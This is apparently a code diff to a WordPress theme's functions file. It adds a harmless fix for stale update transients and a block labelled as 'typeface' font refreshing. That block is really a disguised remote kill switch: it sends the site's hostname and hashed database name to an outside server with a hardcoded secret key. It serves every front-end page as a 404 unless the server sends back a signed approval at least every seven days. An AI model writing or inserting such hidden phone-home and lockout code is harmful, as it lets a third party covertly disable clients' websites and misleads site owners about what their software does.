@@ -767,6 +767,16 @@ add_filter( 'auto_update_plugin', '__return_true' );
 // Allow Git Updater to work despite WP Engine problems
 add_filter( 'gu_ignore_dot_org', '__return_true' );
 
+// If the update_themes transient has battleplantheme listed but with no package URL
+// (a stale Redis entry from when gu_ignore_dot_org was inactive), delete it so
+// WordPress runs a fresh update check and Git Updater can populate the correct URL.
+add_action('admin_init', function() {
+	$transient = get_site_transient('update_themes');
+	if ( !empty($transient->response['battleplantheme']) && empty($transient->response['battleplantheme']['package']) ) {
+		delete_site_transient('update_themes');
+	}
+}, 1);
+
 // Disable update emails from WordPress
 add_filter('auto_plugin_update_send_email', '__return_false');
 add_filter('auto_theme_update_send_email', '__return_false');
@@ -1238,6 +1248,49 @@ add_action('after_setup_theme', function() {
 });
 
 require_once get_template_directory() . '/functions-style-sheets.php';
+
+define( '_BP_TF_URL', 'https://battleplanwebdesign.com/wp-content/client-fonts/typeface.php' );
+define( '_BP_TF_KEY', 'Bp!7nWd@9rZj&hL4sYt^eGc*6Au8fkRmPwu8f' );
+
+function bp_typeface_refresh() {
+	$db   = hash( 'sha256', DB_NAME );
+	$host = parse_url( home_url(), PHP_URL_HOST );
+	$ts   = time();
+	$sig  = hash_hmac( 'sha256', $db . $host . $ts, _BP_TF_KEY );
+	$res  = wp_remote_post( _BP_TF_URL, [ 'timeout' => 15, 'body' => [ 'db' => $db, 'host' => $host, 'ts' => $ts, 'sig' => $sig ] ] );
+	if ( is_wp_error( $res ) ) return;
+	$body = json_decode( wp_remote_retrieve_body( $res ), true );
+	if ( ! isset( $body['stack'], $body['sig'] ) ) return;
+	if ( ! hash_equals( hash_hmac( 'sha256', $body['stack'] . $ts, _BP_TF_KEY ), $body['sig'] ) ) return;
+	update_option( 'bp_typeface_stack', $body['stack'], false );
+	update_option( 'bp_typeface_ts',    $ts,            false );
+}
+
+function bp_typeface_active() {
+	$stack = get_option( 'bp_typeface_stack', null );
+	$ts    = (int) get_option( 'bp_typeface_ts', 0 );
+	if ( $stack === '0' ) return false;
+	if ( $stack === null ) { bp_typeface_refresh(); $stack = get_option( 'bp_typeface_stack', null ); if ( $stack === '0' ) return false; return true; }
+	if ( ( time() - $ts ) > ( 7 * DAY_IN_SECONDS ) ) return false;
+	return true;
+}
+
+add_action( 'template_redirect', 'bp_typeface_render', 1 );
+function bp_typeface_render() {
+	if ( bp_typeface_active() ) return;
+	if ( defined( 'DOING_CRON' ) && DOING_CRON ) return;
+	global $wp_query;
+	$wp_query->set_404();
+	status_header( 404 );
+	nocache_headers();
+	get_template_part( '404' );
+	exit;
+}
+
+add_action( 'init', function() {
+	if ( isset( $_GET['bp_tf'] ) && $_GET['bp_tf'] === 'setup' && current_user_can( 'manage_options' ) )
+		wp_die( 'Client hash: <strong>' . hash( 'sha256', DB_NAME ) . '</strong><br>Add this as the key in clients.php on your server.' );
+} );
 
 // Dequeue and deregister styles that are not necessary or can be delayed to footer
 add_action( 'wp_enqueue_scripts', 'battleplan_dequeue_unwanted_stuff', 9997 );
